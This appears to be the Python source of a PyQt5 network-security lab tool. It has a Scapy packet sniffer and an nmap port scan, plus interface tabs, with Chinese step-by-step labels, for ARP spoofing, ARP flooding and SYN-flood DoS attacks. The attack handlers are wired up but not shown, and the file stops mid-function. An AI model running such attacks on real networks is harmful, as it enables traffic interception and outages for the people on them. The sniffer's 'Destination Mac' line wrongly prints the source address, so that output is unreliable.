# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'ui.ui'
#
# Created by: PyQt5 UI code generator 5.15.6
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.
import nmap
from threading import Thread
from scapy.all import *
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import QThread,pyqtSignal
from scapy.all import *
import cryptography
from PyQt5 import  QtWidgets,uic
from PyQt5.QtGui import QPalette, QBrush, QPixmap,QColor,QIcon
from queue import Queue
from PyQt5.QtWidgets import QDialog, QTableWidget, QTableWidgetItem, QMessageBox, QInputDialog, QLineEdit,QFileDialog,QHeaderView
import binascii
import ipaddress
import random
def Generate_mac():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    mac_str = ':'.join(map(lambda x: "%02x" % x, mac))
    return mac_str
def Generate_ip(net):
    network = ipaddress.IPv4Network(net)
    return network

class Thread_detect(QThread):
    signal = pyqtSignal(int)

    def __init__(self):
        super(Thread_detect, self).__init__()

    def run(self):
        self.signal.emit(1)

def packet_handle(packet):
    store = ""
    if packet.haslayer(Ether):
        Ether_packet = packet[Ether]
        store = store + 'Source Mac: ' + str(Ether_packet.src) + '\n'
        store = store + 'Destination Mac: ' + str(Ether_packet.src) + '\n'
        store = store + 'Protocol Type: ' + str(Ether_packet.type) + '\n' + '\n'
        if packet.haslayer(IP):
            ip_packet = packet[IP]
            ip_src = ip_packet.src
            ip_dst = ip_packet.dst
            ip_len = ip_packet.len
            ip_ttl = ip_packet.ttl
            ip_proto = ip_packet.proto
            ip_version = ip_packet.version
            ip_headerlen = ip_packet.ihl
            ip_tos = ip_packet.tos
            ip_flags = ip_packet.flags
            ip_checksum = ip_packet.chksum
            store = store + 'Source IP: ' + str(ip_src) + '\n' + 'Destination IP: ' + str(
                ip_dst) + '\n' + 'Packet Length: ' + str(ip_len) + '\n' + 'TTL: ' + str(ip_ttl) + '\n'
            store = store + 'Transporation Protocol: ' + str(ip_proto) + '\n' + 'IP Version: ' + str(
                ip_version) + '\n' + 'Header Length: ' + str(ip_headerlen) + '\n'
            store = store + 'Type of Service: ' + str(ip_tos) + '\n' + 'Flag: ' + str(
                ip_flags) + '\n' + 'Checksum: ' + str(ip_checksum) + '\n\n'
            if packet.haslayer(TCP):
                tcp_packet = packet[TCP]
                store = store + 'Source Port: ' + str(tcp_packet.sport) + '\n' + 'Destination Port: ' + str(
                    tcp_packet.dport) + '\n' + 'Sequence Number: ' + str(tcp_packet.seq) + '\n'
                store = store + 'Acknowledge Number: ' + str(tcp_packet.ack) + '\n' + 'Flags: ' + str(
                    tcp_packet.flags) + '\n' + 'Window Size: ' + str(tcp_packet.window) + '\n\n'
            elif packet.haslayer(UDP):
                udp_packet = packet[UDP]
                store = store + 'Source Port: ' + str(udp_packet.sport) + '\n' + 'Destination Port: ' + str(
                    udp_packet.dport) + '\n'
                store = store + 'Length: ' + str(udp_packet.len) + '\n' + 'Checksum: ' + str(udp_packet.chksum) + '\n\n'
            elif packet.haslayer(ICMP):
                icmp_packet = packet[ICMP]
                store = store + 'Type: '+str(icmp_packet.type) + '\n' + 'Code: '+ str(icmp_packet.code) + '\n'+'Identify: '+str(icmp_packet.id) + '\n' + 'Sequence: '+str(icmp_packet.seq)+'\n'+'Checksum: '+str(icmp_packet.chksum) + '\n'+'Payload: '+str(icmp_packet.payload)
        elif packet.haslayer(ARP):
            arp_packet = packet[ARP]
            store = store + 'Source Mac: ' + str(arp_packet.hwsrc) + '\n' + 'Destination Mac: ' + str(
                arp_packet.hwdst) + '\n' + 'Operation: ' + str(arp_packet.op) + '\n'
            store = store + 'Source IP: ' + str(arp_packet.psrc) + '\n' + 'Destination IP: ' + str(
                arp_packet.pdst) + '\n'
        else:
            store = store + 'Unknown Protocol\n'
    return store


class Ui_MainWindow(QtWidgets.QMainWindow):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1079, 797)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.verticalLayoutWidget = QtWidgets.QWidget(self.centralwidget)
        self.verticalLayoutWidget.setGeometry(QtCore.QRect(0, 0, 1081, 771))
        self.verticalLayoutWidget.setObjectName("verticalLayoutWidget")
        self.verticalLayout = QtWidgets.QVBoxLayout(self.verticalLayoutWidget)
        self.verticalLayout.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout.setObjectName("verticalLayout")
        self.tabWidget = QtWidgets.QTabWidget(self.verticalLayoutWidget)
        self.tabWidget.setMaximumSize(QtCore.QSize(1079, 769))
        self.tabWidget.setTabPosition(QtWidgets.QTabWidget.West)
        self.tabWidget.setObjectName("tabWidget")
        self.tab_3 = QtWidgets.QWidget()
        self.tab_3.setObjectName("tab_3")
        self.horizontalLayoutWidget = QtWidgets.QWidget(self.tab_3)
        self.horizontalLayoutWidget.setGeometry(QtCore.QRect(0, 0, 1051, 41))
        self.horizontalLayoutWidget.setObjectName("horizontalLayoutWidget")
        self.horizontalLayout = QtWidgets.QHBoxLayout(self.horizontalLayoutWidget)
        self.horizontalLayout.setContentsMargins(0, 0, 0, 0)
        self.horizontalLayout.setObjectName("horizontalLayout")
        self.comboBox = QtWidgets.QComboBox(self.horizontalLayoutWidget)
        self.comboBox.setObjectName("comboBox")
        self.horizontalLayout.addWidget(self.comboBox)
        self.pushButton_3 = QtWidgets.QPushButton(self.horizontalLayoutWidget)
        self.pushButton_3.setObjectName("pushButton_3")
        self.horizontalLayout.addWidget(self.pushButton_3)
        self.pushButton_5 = QtWidgets.QPushButton(self.horizontalLayoutWidget)
        self.pushButton_5.setObjectName("pushButton_5")
        self.horizontalLayout.addWidget(self.pushButton_5)
        self.pushButton_4 = QtWidgets.QPushButton(self.horizontalLayoutWidget)
        self.pushButton_4.setObjectName("pushButton_4")
        self.horizontalLayout.addWidget(self.pushButton_4)
        self.pushButton_2 = QtWidgets.QPushButton(self.horizontalLayoutWidget)
        self.pushButton_2.setObjectName("pushButton_2")
        self.horizontalLayout.addWidget(self.pushButton_2)
        self.pushButton = QtWidgets.QPushButton(self.horizontalLayoutWidget)
        self.pushButton.setObjectName("pushButton")
        self.horizontalLayout.addWidget(self.pushButton)
        self.verticalLayoutWidget_2 = QtWidgets.QWidget(self.tab_3)
        self.verticalLayoutWidget_2.setGeometry(QtCore.QRect(0, 40, 1081, 481))
        self.verticalLayoutWidget_2.setObjectName("verticalLayoutWidget_2")
        self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.verticalLayoutWidget_2)
        self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.tableWidget = QtWidgets.QTableWidget(self.verticalLayoutWidget_2)
        self.tableWidget.setObjectName("tableWidget")
        self.tableWidget.setColumnCount(5)
        self.tableWidget.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        item.setBackground(QtGui.QColor(20, 212, 255))
        self.tableWidget.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(3, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(4, item)
        self.verticalLayout_2.addWidget(self.tableWidget)
        self.horizontalLayoutWidget_2 = QtWidgets.QWidget(self.tab_3)
        self.horizontalLayoutWidget_2.setGeometry(QtCore.QRect(-1, 519, 1081, 231))
        self.horizontalLayoutWidget_2.setObjectName("horizontalLayoutWidget_2")
        self.horizontalLayout_3 = QtWidgets.QHBoxLayout(self.horizontalLayoutWidget_2)
        self.horizontalLayout_3.setContentsMargins(0, 0, 0, 0)
        self.horizontalLayout_3.setObjectName("horizontalLayout_3")
        self.textEdit_2 = QtWidgets.QTextEdit(self.horizontalLayoutWidget_2)
        self.textEdit_2.setObjectName("textEdit_2")
        self.horizontalLayout_3.addWidget(self.textEdit_2)
        self.textEdit = QtWidgets.QTextEdit(self.horizontalLayoutWidget_2)
        self.textEdit.setObjectName("textEdit")
        self.horizontalLayout_3.addWidget(self.textEdit)
        self.tabWidget.addTab(self.tab_3, "")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName("tab")
        self.widget = QtWidgets.QWidget(self.tab)
        self.widget.setGeometry(QtCore.QRect(-1, -1, 1081, 751))
        self.widget.setObjectName("widget")
        self.label_11 = QtWidgets.QLabel(self.widget)
        self.label_11.setGeometry(QtCore.QRect(70, 70, 71, 21))
        self.label_11.setObjectName("label_11")
        self.label_7 = QtWidgets.QLabel(self.widget)
        self.label_7.setGeometry(QtCore.QRect(560, 30, 171, 21))
        self.label_7.setObjectName("label_7")
        self.choose_eth = QtWidgets.QComboBox(self.widget)
        self.choose_eth.setGeometry(QtCore.QRect(110, 30, 371, 21))
        self.choose_eth.setObjectName("choose_eth")
        self.label = QtWidgets.QLabel(self.widget)
        self.label.setGeometry(QtCore.QRect(20, 20, 71, 31))
        self.label.setObjectName("label")
        self.pushButton_6 = QtWidgets.QPushButton(self.widget)
        self.pushButton_6.setGeometry(QtCore.QRect(400, 120, 41, 41))
        self.pushButton_6.setText("")
        self.pushButton_6.setObjectName("pushButton_6")
        self.textEdit_6 = QtWidgets.QTextEdit(self.widget)
        self.textEdit_6.setGeometry(QtCore.QRect(220, 70, 221, 31))
        self.textEdit_6.setObjectName("textEdit_6")
        self.label_2 = QtWidgets.QLabel(self.widget)
        self.label_2.setGeometry(QtCore.QRect(70, 130, 171, 21))
        self.label_2.setObjectName("label_2")
        self.textEdit_8 = QtWidgets.QTextEdit(self.widget)
        self.textEdit_8.setGeometry(QtCore.QRect(70, 170, 371, 471))
        self.textEdit_8.setObjectName("textEdit_8")
        self.tableWidget_2 = QtWidgets.QTableWidget(self.widget)
        self.tableWidget_2.setGeometry(QtCore.QRect(570, 80, 461, 561))
        self.tableWidget_2.setObjectName("tableWidget_2")
        self.tableWidget_2.setColumnCount(3)
        self.tableWidget_2.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget_2.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget_2.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget_2.setHorizontalHeaderItem(2, item)
        self.tabWidget.addTab(self.tab, "")
        self.tab_4 = QtWidgets.QWidget()
        self.tab_4.setObjectName("tab_4")
        self.label_21 = QtWidgets.QLabel(self.tab_4)
        self.label_21.setGeometry(QtCore.QRect(20, 20, 71, 31))
        self.label_21.setObjectName("label_21")
        self.choose_eth_3 = QtWidgets.QComboBox(self.tab_4)
        self.choose_eth_3.setGeometry(QtCore.QRect(110, 30, 371, 21))
        self.choose_eth_3.setObjectName("choose_eth_3")
        self.label_22 = QtWidgets.QLabel(self.tab_4)
        self.label_22.setGeometry(QtCore.QRect(560, 30, 71, 21))
        self.label_22.setObjectName("label_22")
        self.textEdit_13 = QtWidgets.QTextEdit(self.tab_4)
        self.textEdit_13.setGeometry(QtCore.QRect(650, 30, 221, 31))
        self.textEdit_13.setObjectName("textEdit_13")
        self.label_23 = QtWidgets.QLabel(self.tab_4)
        self.label_23.setGeometry(QtCore.QRect(30, 90, 171, 21))
        self.label_23.setObjectName("label_23")
        self.pushButton_10 = QtWidgets.QPushButton(self.tab_4)
        self.pushButton_10.setGeometry(QtCore.QRect(550, 80, 131, 31))
        self.pushButton_10.setText("")
        self.pushButton_10.setObjectName("pushButton_10")
        self.tableWidget_4 = QtWidgets.QTableWidget(self.tab_4)
        self.tableWidget_4.setGeometry(QtCore.QRect(10, 130, 1041, 561))
        self.tableWidget_4.setObjectName("tableWidget_4")
        self.tableWidget_4.setColumnCount(4)
        self.tableWidget_4.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget_4.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget_4.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget_4.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget_4.setHorizontalHeaderItem(3, item)
        self.tabWidget.addTab(self.tab_4, "")
        self.tab_10 = QtWidgets.QWidget()
        self.tab_10.setObjectName("tab_10")
        self.label_3 = QtWidgets.QLabel(self.tab_10)
        self.label_3.setGeometry(QtCore.QRect(10, 50, 71, 21))
        self.label_3.setObjectName("label_3")
        self.label_8 = QtWidgets.QLabel(self.tab_10)
        self.label_8.setGeometry(QtCore.QRect(20, 630, 471, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_8.setFont(font)
        self.label_8.setObjectName("label_8")
        self.textEdit_3 = QtWidgets.QTextEdit(self.tab_10)
        self.textEdit_3.setGeometry(QtCore.QRect(100, 50, 211, 31))
        self.textEdit_3.setObjectName("textEdit_3")
        self.label_9 = QtWidgets.QLabel(self.tab_10)
        self.label_9.setGeometry(QtCore.QRect(10, 100, 81, 21))
        self.label_9.setObjectName("label_9")
        self.pushButton_7 = QtWidgets.QPushButton(self.tab_10)
        self.pushButton_7.setGeometry(QtCore.QRect(930, 40, 91, 31))
        self.pushButton_7.setObjectName("pushButton_7")
        self.label_6 = QtWidgets.QLabel(self.tab_10)
        self.label_6.setGeometry(QtCore.QRect(20, 580, 461, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_6.setFont(font)
        self.label_6.setObjectName("label_6")
        self.textEdit_4 = QtWidgets.QTextEdit(self.tab_10)
        self.textEdit_4.setGeometry(QtCore.QRect(550, 50, 211, 31))
        self.textEdit_4.setObjectName("textEdit_4")
        self.label_4 = QtWidgets.QLabel(self.tab_10)
        self.label_4.setGeometry(QtCore.QRect(460, 50, 71, 21))
        self.label_4.setObjectName("label_4")
        self.textEdit_7 = QtWidgets.QTextEdit(self.tab_10)
        self.textEdit_7.setGeometry(QtCore.QRect(100, 100, 211, 31))
        self.textEdit_7.setObjectName("textEdit_7")
        self.label_10 = QtWidgets.QLabel(self.tab_10)
        self.label_10.setGeometry(QtCore.QRect(20, 680, 341, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_10.setFont(font)
        self.label_10.setObjectName("label_10")
        self.label_5 = QtWidgets.QLabel(self.tab_10)
        self.label_5.setGeometry(QtCore.QRect(0, 150, 71, 21))
        self.label_5.setObjectName("label_5")
        self.pushButton_32 = QtWidgets.QPushButton(self.tab_10)
        self.pushButton_32.setGeometry(QtCore.QRect(930, 100, 91, 31))
        self.pushButton_32.setObjectName("pushButton_32")
        self.label_79 = QtWidgets.QLabel(self.tab_10)
        self.label_79.setGeometry(QtCore.QRect(460, 100, 71, 21))
        self.label_79.setObjectName("label_79")
        self.pushButton_33 = QtWidgets.QPushButton(self.tab_10)
        self.pushButton_33.setGeometry(QtCore.QRect(930, 70, 91, 31))
        self.pushButton_33.setObjectName("pushButton_33")
        self.label_80 = QtWidgets.QLabel(self.tab_10)
        self.label_80.setGeometry(QtCore.QRect(10, 0, 71, 31))
        self.label_80.setObjectName("label_80")
        self.label_82 = QtWidgets.QLabel(self.tab_10)
        self.label_82.setGeometry(QtCore.QRect(620, 550, 281, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_82.setFont(font)
        self.label_82.setObjectName("label_82")
        self.label_84 = QtWidgets.QLabel(self.tab_10)
        self.label_84.setGeometry(QtCore.QRect(620, 690, 341, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_84.setFont(font)
        self.label_84.setObjectName("label_84")
        self.choose_eth_7 = QtWidgets.QComboBox(self.tab_10)
        self.choose_eth_7.setGeometry(QtCore.QRect(90, 10, 371, 21))
        self.choose_eth_7.setObjectName("choose_eth_7")
        self.label_86 = QtWidgets.QLabel(self.tab_10)
        self.label_86.setGeometry(QtCore.QRect(620, 590, 361, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_86.setFont(font)
        self.label_86.setObjectName("label_86")
        self.label_87 = QtWidgets.QLabel(self.tab_10)
        self.label_87.setGeometry(QtCore.QRect(620, 640, 351, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_87.setFont(font)
        self.label_87.setObjectName("label_87")
        self.textEdit_47 = QtWidgets.QTextEdit(self.tab_10)
        self.textEdit_47.setGeometry(QtCore.QRect(550, 100, 211, 31))
        self.textEdit_47.setObjectName("textEdit_47")
        self.textEdit_48 = QtWidgets.QTextEdit(self.tab_10)
        self.textEdit_48.setGeometry(QtCore.QRect(10, 170, 511, 361))
        self.textEdit_48.setObjectName("textEdit_48")
        self.textEdit_49 = QtWidgets.QTextEdit(self.tab_10)
        self.textEdit_49.setGeometry(QtCore.QRect(520, 170, 521, 361))
        self.textEdit_49.setObjectName("textEdit_49")
        self.tabWidget.addTab(self.tab_10, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.textEdit_9 = QtWidgets.QTextEdit(self.tab_2)
        self.textEdit_9.setGeometry(QtCore.QRect(100, 120, 211, 31))
        self.textEdit_9.setObjectName("textEdit_9")
        self.label_12 = QtWidgets.QLabel(self.tab_2)
        self.label_12.setGeometry(QtCore.QRect(20, 80, 71, 21))
        self.label_12.setObjectName("label_12")
        self.pushButton_8 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_8.setGeometry(QtCore.QRect(350, 120, 91, 31))
        self.pushButton_8.setObjectName("pushButton_8")
        self.label_13 = QtWidgets.QLabel(self.tab_2)
        self.label_13.setGeometry(QtCore.QRect(20, 10, 71, 31))
        self.label_13.setObjectName("label_13")
        self.label_14 = QtWidgets.QLabel(self.tab_2)
        self.label_14.setGeometry(QtCore.QRect(80, 330, 341, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_14.setFont(font)
        self.label_14.setObjectName("label_14")
        self.choose_eth_2 = QtWidgets.QComboBox(self.tab_2)
        self.choose_eth_2.setGeometry(QtCore.QRect(100, 20, 371, 21))
        self.choose_eth_2.setObjectName("choose_eth_2")
        self.textEdit_10 = QtWidgets.QTextEdit(self.tab_2)
        self.textEdit_10.setGeometry(QtCore.QRect(100, 70, 211, 31))
        self.textEdit_10.setObjectName("textEdit_10")
        self.label_15 = QtWidgets.QLabel(self.tab_2)
        self.label_15.setGeometry(QtCore.QRect(80, 290, 351, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_15.setFont(font)
        self.label_15.setObjectName("label_15")
        self.label_16 = QtWidgets.QLabel(self.tab_2)
        self.label_16.setGeometry(QtCore.QRect(460, 80, 71, 21))
        self.label_16.setObjectName("label_16")
        self.textEdit_11 = QtWidgets.QTextEdit(self.tab_2)
        self.textEdit_11.setGeometry(QtCore.QRect(520, 70, 211, 31))
        self.textEdit_11.setObjectName("textEdit_11")
        self.textEdit_12 = QtWidgets.QTextEdit(self.tab_2)
        self.textEdit_12.setGeometry(QtCore.QRect(40, 380, 421, 371))
        self.textEdit_12.setObjectName("textEdit_12")
        self.label_17 = QtWidgets.QLabel(self.tab_2)
        self.label_17.setGeometry(QtCore.QRect(20, 220, 71, 21))
        self.label_17.setObjectName("label_17")
        self.label_18 = QtWidgets.QLabel(self.tab_2)
        self.label_18.setGeometry(QtCore.QRect(80, 250, 471, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_18.setFont(font)
        self.label_18.setObjectName("label_18")
        self.label_19 = QtWidgets.QLabel(self.tab_2)
        self.label_19.setGeometry(QtCore.QRect(20, 120, 71, 21))
        self.label_19.setObjectName("label_19")
        self.label_20 = QtWidgets.QLabel(self.tab_2)
        self.label_20.setGeometry(QtCore.QRect(80, 210, 401, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_20.setFont(font)
        self.label_20.setObjectName("label_20")
        self.label_41 = QtWidgets.QLabel(self.tab_2)
        self.label_41.setGeometry(QtCore.QRect(540, 210, 71, 21))
        self.label_41.setObjectName("label_41")
        self.label_42 = QtWidgets.QLabel(self.tab_2)
        self.label_42.setGeometry(QtCore.QRect(600, 300, 351, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_42.setFont(font)
        self.label_42.setObjectName("label_42")
        self.label_45 = QtWidgets.QLabel(self.tab_2)
        self.label_45.setGeometry(QtCore.QRect(600, 210, 281, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_45.setFont(font)
        self.label_45.setObjectName("label_45")
        self.pushButton_19 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_19.setGeometry(QtCore.QRect(660, 120, 111, 31))
        self.pushButton_19.setObjectName("pushButton_19")
        self.label_46 = QtWidgets.QLabel(self.tab_2)
        self.label_46.setGeometry(QtCore.QRect(320, 80, 71, 21))
        self.label_46.setObjectName("label_46")
        self.label_47 = QtWidgets.QLabel(self.tab_2)
        self.label_47.setGeometry(QtCore.QRect(600, 260, 361, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_47.setFont(font)
        self.label_47.setObjectName("label_47")
        self.pushButton_20 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_20.setGeometry(QtCore.QRect(480, 120, 111, 31))
        self.pushButton_20.setObjectName("pushButton_20")
        self.textEdit_26 = QtWidgets.QTextEdit(self.tab_2)
        self.textEdit_26.setGeometry(QtCore.QRect(370, 70, 41, 31))
        self.textEdit_26.setObjectName("textEdit_26")
        self.label_48 = QtWidgets.QLabel(self.tab_2)
        self.label_48.setGeometry(QtCore.QRect(600, 340, 341, 41))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.label_48.setFont(font)
        self.label_48.setObjectName("label_48")
        self.textEdit_29 = QtWidgets.QTextEdit(self.tab_2)
        self.textEdit_29.setGeometry(QtCore.QRect(590, 380, 421, 371))
        self.textEdit_29.setObjectName("textEdit_29")
        self.tabWidget.addTab(self.tab_2, "")
        self.verticalLayout.addWidget(self.tabWidget)
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        self.tabWidget.setCurrentIndex(4)
        self.pushButton_3.clicked.connect(MainWindow.start_cap) # type: ignore
        self.pushButton_5.clicked.connect(MainWindow.set_filter) # type: ignore
        self.pushButton_4.clicked.connect(MainWindow.stop_cap) # type: ignore
        self.pushButton_2.clicked.connect(MainWindow.save) # type: ignore
        self.pushButton.clicked.connect(MainWindow.clear) # type: ignore
        self.pushButton_6.clicked.connect(MainWindow.start_scan) # type: ignore
        self.pushButton_7.clicked.connect(MainWindow.send_reply) # type: ignore
        self.pushButton_33.clicked.connect(MainWindow.send_request) # type: ignore
        self.pushButton_32.clicked.connect(MainWindow.stop_foolattack) # type: ignore
        self.tableWidget.cellClicked['int','int'].connect(MainWindow.choosewhich) # type: ignore
        self.pushButton_10.clicked.connect(MainWindow.find_port) # type: ignore
        self.pushButton_8.clicked.connect(MainWindow.start_arpflood) # type: ignore
        self.pushButton_20.clicked.connect(MainWindow.start_syn) # type: ignore
        self.pushButton_19.clicked.connect(MainWindow.stop_flood) # type: ignore
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.pushButton_3.setText(_translate("MainWindow", "开始"))
        self.pushButton_5.setText(_translate("MainWindow", "设置过滤器"))
        self.pushButton_4.setText(_translate("MainWindow", "停止"))
        self.pushButton_2.setText(_translate("MainWindow", "保存"))
        self.pushButton.setText(_translate("MainWindow", "清屏"))
        item = self.tableWidget.horizontalHeaderItem(0)
        item.setText(_translate("MainWindow", "时间"))
        item = self.tableWidget.horizontalHeaderItem(1)
        item.setText(_translate("MainWindow", "源MAC地址"))
        item = self.tableWidget.horizontalHeaderItem(2)
        item.setText(_translate("MainWindow", "目的MAC地址"))
        item = self.tableWidget.horizontalHeaderItem(3)
        item.setText(_translate("MainWindow", "协议类型"))
        item = self.tableWidget.horizontalHeaderItem(4)
        item.setText(_translate("MainWindow", "信息"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), _translate("MainWindow", "嗅探器"))
        self.label_11.setText(_translate("MainWindow", "输入网络"))
        self.label_7.setText(_translate("MainWindow", "局域网内存活的主机如下:"))
        self.label.setText(_translate("MainWindow", "选择网络接口"))
        self.label_2.setText(_translate("MainWindow", "扫描局域网中的主机....."))
        item = self.tableWidget_2.horizontalHeaderItem(0)
        item.setText(_translate("MainWindow", "序号"))
        item = self.tableWidget_2.horizontalHeaderItem(1)
        item.setText(_translate("MainWindow", "IP地址"))
        item = self.tableWidget_2.horizontalHeaderItem(2)
        item.setText(_translate("MainWindow", "MAC地址"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("MainWindow", "网络扫描"))
        self.label_21.setText(_translate("MainWindow", "选择网络接口"))
        self.label_22.setText(_translate("MainWindow", "输入主机"))
        self.label_23.setText(_translate("MainWindow", "扫描目标主机端口....."))
        item = self.tableWidget_4.horizontalHeaderItem(0)
        item.setText(_translate("MainWindow", "协议"))
        item = self.tableWidget_4.horizontalHeaderItem(1)
        item.setText(_translate("MainWindow", "端口号"))
        item = self.tableWidget_4.horizontalHeaderItem(2)
        item.setText(_translate("MainWindow", "状态"))
        item = self.tableWidget_4.horizontalHeaderItem(3)
        item.setText(_translate("MainWindow", "服务"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), _translate("MainWindow", "端口扫描"))
        self.label_3.setText(_translate("MainWindow", "目标IP"))
        self.label_8.setText(_translate("MainWindow", "② 攻击者受害者发送ARP响应数据包，伪造IP地址，使用真实物理地址"))
        self.label_9.setText(_translate("MainWindow", "想要使用的IP"))
        self.pushButton_7.setText(_translate("MainWindow", "发送ARP响应包"))
        self.label_6.setText(_translate("MainWindow", "① 攻击者通过网络发送ARP请求数据包，获得局域网内存活主机的地址"))
        self.label_4.setText(_translate("MainWindow", "目标MAC"))
        self.label_10.setText(_translate("MainWindow", "③ 中间人攻击方式"))
        self.label_5.setText(_translate("MainWindow", "详细信息"))
        self.pushButton_32.setText(_translate("MainWindow", "停止"))
        self.label_79.setText(_translate("MainWindow", "网络号"))
        self.pushButton_33.setText(_translate("MainWindow", "发送ARP请求包"))
        self.label_80.setText(_translate("MainWindow", "选择网络接口"))
        self.label_82.setText(_translate("MainWindow", "① 被攻击主机的IP地址和物理地址作为源地址"))
        self.label_84.setText(_translate("MainWindow", "④ 大量无用的数据包占用受害者的主机资源"))
        self.label_86.setText(_translate("MainWindow", "② 向整个局域网所有主机(随机生成)发送ARP请求数据包"))
        self.label_87.setText(_translate("MainWindow", "③ 局域网所有主机向受害者返回ARP响应数据包"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_10), _translate("MainWindow", "中间人攻击"))
        self.label_12.setText(_translate("MainWindow", "目标IP"))
        self.pushButton_8.setText(_translate("MainWindow", "发送ARP响应包"))
        self.label_13.setText(_translate("MainWindow", "选择网络接口"))
        self.label_14.setText(_translate("MainWindow", "④ 会导致受害者断网"))
        self.label_15.setText(_translate("MainWindow", "③ 大量ARP响应数据包修改受害者ARP表的动态表项"))
        self.label_16.setText(_translate("MainWindow", "目标MAC"))
        self.label_17.setText(_translate("MainWindow", "详细信息"))
        self.label_18.setText(_translate("MainWindow", "② 构造的ARP数据包使用同一局域网下的虚假IP地址和MAC地址"))
        self.label_19.setText(_translate("MainWindow", "网络号"))
        self.label_20.setText(_translate("MainWindow", "① 攻击者向受害者发送大量的ARP响应数据包"))
        self.label_41.setText(_translate("MainWindow", "详细信息"))
        self.label_42.setText(_translate("MainWindow", "③ 网络中存在大量的TCPSYN数据包，源地址是假地址"))
        self.label_45.setText(_translate("MainWindow", "① 被攻击主机有大量等待的TCP连接"))
        self.pushButton_19.setText(_translate("MainWindow", "停止"))
        self.label_46.setText(_translate("MainWindow", "端口号"))
        self.label_47.setText(_translate("MainWindow", "② 被攻击主机的系统资源被大量占用，造成主机卡顿"))
        self.pushButton_20.setText(_translate("MainWindow", "发动SYNFlooding"))
        self.label_48.setText(_translate("MainWindow", "④ 高流量无用数据占据大量网络带宽，造成网络拥塞"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate("MainWindow", "Dos攻击"))
    def find_port(self):
        self.wifil5 = self.choose_eth_3.currentText()
        self.dst_ipl5 = self.textEdit_13.toPlainText()
        self.threadl51 = Thread(target= self.scan_port)
        self.threadl51.start()

    def scan_port(self):
        # 创建nmap扫描器对象
        scanner = nmap.PortScanner()
        scanner.scan(self.dst_ipl5, '1-1024')
        row = 0

        host = scanner.all_hosts()[0]#扫描的主机,本程序只扫描了一个主机，列表，取第一个成员
        for proto in scanner[host].all_protocols():#也是返回的一个列表，包含扫描到的一些使用的协议
            lport = scanner[host][proto].keys()#该协议关联的端口号
            for port in sorted(lport):
                self.tableWidget_4.setRowCount(self.tableWidget_4.rowCount() + 1)
                self.tableWidget_4.setItem(row,0,QTableWidgetItem(str(proto)))
                self.tableWidget_4.setItem(row,1,QTableWidgetItem(str(port)))
                self.tableWidget_4.setItem(row,2,QTableWidgetItem(scanner[host][proto][port]['state']))#主机的状态：开发，关闭，过滤
